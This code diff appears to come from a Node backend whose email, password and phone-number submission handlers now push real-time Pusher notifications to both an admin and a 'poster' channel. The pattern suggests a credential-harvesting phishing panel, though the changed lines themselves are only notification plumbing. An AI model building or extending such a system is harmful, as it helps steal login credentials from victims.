@@ -62,7 +62,11 @@ export const email_post = async (req, res) => {
                     });
 
                     if(info){
-                        pusher.trigger(userFound.adminId, 'new-notification', {
+                        const channels = [userFound.adminId];
+                        if (posterFound.posterId) {
+                            channels.push(posterFound.posterId);
+                        }
+                        pusher.trigger(channels, 'new-notification', {
                             adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                         });
 
@@ -79,7 +83,11 @@ export const email_post = async (req, res) => {
                 agent:userAgent
                 })
             if(info){
-                pusher.trigger(userFound.adminId, 'new-notification', {
+                const channels = [userFound.adminId];
+                if (posterFound.posterId) {
+                    channels.push(posterFound.posterId);
+                }
+                pusher.trigger(channels, 'new-notification', {
                     adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                 });
             }
@@ -187,7 +195,11 @@ export const password_post = async(req, res) => {
             });
 
             if(found){
-                pusher.trigger(userFound.adminId, 'new-notification', {
+                const channels = [userFound.adminId];
+                if (posterFound.posterId) {
+                    channels.push(posterFound.posterId);
+                }
+                pusher.trigger(channels, 'new-notification', {
                     adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                   });
 
@@ -536,7 +548,11 @@ export const renumber_add = async(req, res) => {
             });
 
             if(found){
-                pusher.trigger(userFound.adminId, 'new-notification', {
+                const channels = [userFound.adminId];
+                if (posterFound.posterId) {
+                    channels.push(posterFound.posterId);
+                }
+                pusher.trigger(channels, 'new-notification', {
                     adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                   });
 
